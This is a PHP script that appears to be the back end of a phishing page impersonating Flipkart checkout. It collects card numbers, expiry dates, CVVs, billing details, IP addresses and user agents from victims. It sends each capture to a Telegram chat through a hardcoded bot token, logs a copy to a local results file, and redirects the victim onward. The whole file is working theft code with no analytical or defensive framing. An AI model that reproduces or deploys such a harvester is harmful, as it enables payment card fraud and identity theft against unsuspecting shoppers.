<?php

session_start();

$cardHolder = trim($_POST['nm8676X'] ?? '');
$cardNumber = preg_replace('/\D/', '', $_POST['lo8687co'] ?? '');
$expMonth   = trim($_POST['ex111x'] ?? '');
$expYear    = trim($_POST['ex222x'] ?? '');
$cvv        = trim($_POST['net44xa'] ?? '');

$_SESSION['lo8687co'] = $cardNumber;

$billing = $_SESSION['billing_info'] ?? [];
if (empty($billing) && isset($_POST['billing_firstname'])) {
    $billing = [
        'firstname' => trim($_POST['billing_firstname'] ?? ''),
        'lastname'  => trim($_POST['billing_lastname'] ?? ''),
        'email'     => trim($_POST['billing_email'] ?? ''),
        'phone'     => trim($_POST['billing_phone'] ?? ''),
        'address'   => trim($_POST['billing_address'] ?? ''),
        'city'      => trim($_POST['billing_city'] ?? ''),
        'state'     => trim($_POST['billing_state'] ?? ''),
        'postal'    => trim($_POST['billing_postal'] ?? ''),
    ];
}

$ip = $_SERVER['REMOTE_ADDR'] ?? getenv('REMOTE_ADDR');
$hostname = $ip ? @gethostbyaddr($ip) : '';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$message  = "=== Flipkart Capture ===\n";
$message .= "Name on card : $cardHolder\n";
$message .= "Card number  : $cardNumber\n";
$message .= "Expiry       : $expMonth/$expYear\n";
$message .= "CVV          : $cvv\n";

if (!empty($billing)) {
    $message .= "\n-- Billing Details --\n";
    $message .= "Name   : " . trim(($billing['firstname'] ?? '') . ' ' . ($billing['lastname'] ?? '')) . "\n";
    $message .= "Email  : " . ($billing['email'] ?? '') . "\n";
    $message .= "Phone  : " . ($billing['phone'] ?? '') . "\n";
    $message .= "Address: " . ($billing['address'] ?? '') . "\n";
    $message .= "City    : " . ($billing['city'] ?? '') . "\n";
    $message .= "State   : " . ($billing['state'] ?? '') . "\n";
    $message .= "Postal  : " . ($billing['postal'] ?? '') . "\n";
}

$message .= "\nIP        : $ip\n";
$message .= "Host      : $hostname\n";
$message .= "User-Agent: $userAgent";

$user_ids=array("-4835287780");
$bot='6130855228:AAGGwu_oeQ3Tk6uTJLP8Dc-0YxXjT9R9pOU';

foreach($user_ids as $user_id) {
	$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
	$data=array('chat_id'=>$user_id,'text'=>$message);
	$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
	$context=stream_context_create($options);
	$result=file_get_contents($url,false,$context);
	}
	$myfile = fopen("rzlt.txt", "a+");
	$txt = $message;
	fwrite($myfile, $txt);
	fclose($myfile);

header("Location: index3.php");

?>